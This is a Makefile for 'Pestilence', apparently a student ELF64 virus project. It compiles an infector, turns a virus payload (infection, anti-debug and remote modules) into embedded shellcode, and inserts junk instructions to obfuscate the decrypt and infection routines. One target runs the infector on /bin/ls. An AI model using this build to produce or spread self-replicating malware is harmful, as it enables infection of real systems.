NAME = Pestilence

COMPILER = gcc
FLAGS = -MD -fno-stack-protector -fPIC -fPIE 

SRC_DIR				= .
TMP_DIR				= .tmp
OBJ_DIR				= $(TMP_DIR)/obj
OBJ_LIB_DIR			= $(OBJ_DIR)/lib
TMP_LIB_DIR			= $(TMP_DIR)/lib

TABLE_C = virus_table.c

SRC_C = virus.c lib/lib.c lib/infect.c lib/elf64.c lib/remote.c lib/antidebug.c $(TABLE_C)
SRC_S = virus_start.s virus_bonus.s
OBJ	=	$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.o)) \
		$(addprefix $(OBJ_DIR)/, $(SRC_S:.s=.o)) \

SRC_INF_C = pestilence.c lib/lib.c lib/infect.c lib/elf64.c
OBJ_INF	=	$(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.o))

DEP =		$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.d)) \
		$(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.d))

VIRUS = $(TMP_DIR)/virus.template
VIRUS_X = $(TMP_DIR)/virus_shellcode.c

LD_RULES = virus_linking.lds

all: $(NAME)

$(NAME): $(OBJ_INF) $(VIRUS_X)
	$(COMPILER) -o $(NAME) $(OBJ_INF) $(VIRUS_X)

$(VIRUS_X): $(VIRUS)
	cp $< virus_shellcode
	xxd -i virus_shellcode $(VIRUS_X)
	rm virus_shellcode

$(VIRUS): $(OBJ) $(LD_RULES)
	ld -o $@ -T $(LD_RULES) $(OBJ)
	nm -n .tmp/virus.template | grep ' B \| b ' | diff - /dev/null || rm $(VIRUS)

$(TMP_DIR):
	mkdir -p $@

$(OBJ_DIR):
	mkdir -p $@

$(OBJ_LIB_DIR):
	mkdir -p $@

$(TMP_LIB_DIR):
	mkdir -p $@

$(TMP_DIR)/%.s: $(SRC_DIR)/%.c | $(OBJ_DIR) $(TMP_LIB_DIR)
	gcc $(FLAGS) -S $< -o $@

##
## GARBAGE CODE
##

GARBAGE_CF = $(TMP_DIR)/garbage.txt

$(GARBAGE_CF): $(TMP_DIR)
	echo "0" > $@

$(TMP_DIR)/virus.s.g.s: $(TMP_DIR)/virus.s $(GARBAGE_CF)
	#cp $< $@
	# nm --defined-only .tmp/obj/virus.o | grep -v '\.' | grep -i ' t ' | cut -d ' ' -f 3
	./scripts/add_garbage $< -cf $(GARBAGE_CF) -p 200 -l decrypt do_infection entry virus
	#./scripts/add_garbage $< -p 200 -l .ALL

$(TMP_DIR)/lib/lib.s.g.s: $(TMP_DIR)/lib/lib.s $(GARBAGE_CF)
	#cp $< $@
	./scripts/add_garbage $< -cf $(GARBAGE_CF) -p 200 -l ft_open
	#./scripts/add_garbage $< -cf $(GARBAGE_CF) -p 200 -l add_base call close contains d_isdir d_isfile execve exit ffree fget fork fput free getdents getenv getpid lseek malloc _malloc malloc_shared open print println printnb printnbln ptrace read restore_rt scmp signal slen snbr sncmp startswith str_equal waitpid write xstat

$(TABLE_C): $(GARBAGE_CF)
	./scripts/gen_garbage_table -n `cat $(GARBAGE_CF)` -o $@

##
## END
##

$(OBJ_DIR)/%.o: $(TMP_DIR)/%.s.g.s | $(OBJ_DIR) $(OBJ_LIB_DIR)
	gcc $(FLAGS) -c $< -o $@

$(OBJ_DIR)/%.o: $(SRC_DIR)/%.c | $(OBJ_DIR) $(OBJ_LIB_DIR)
	$(COMPILER) $(FLAGS) -c $< -o $@

$(OBJ_DIR)/%.o: $(SRC_DIR)/%.s | $(OBJ_DIR) $(OBJ_LIB_DIR)
	nasm -f elf64 $< -o $@

clean:
	rm -rf $(DEP)
	rm -rf $(OBJ)
	rm -rf $(OBJ_DIR)
	rm -rf $(TMP_DIR)
	rm -rf $(TABLE_C)

fclean: clean
	rm -rf $(NAME)
	rm -rf woody

re: fclean
	echo $(DEP)
	$(MAKE)

-include $(DEP)

.PHONY: all re clean fclean test unit_test

test: all
	(cd test && ./test.sh)

ls: all
	./$(NAME) /bin/ls
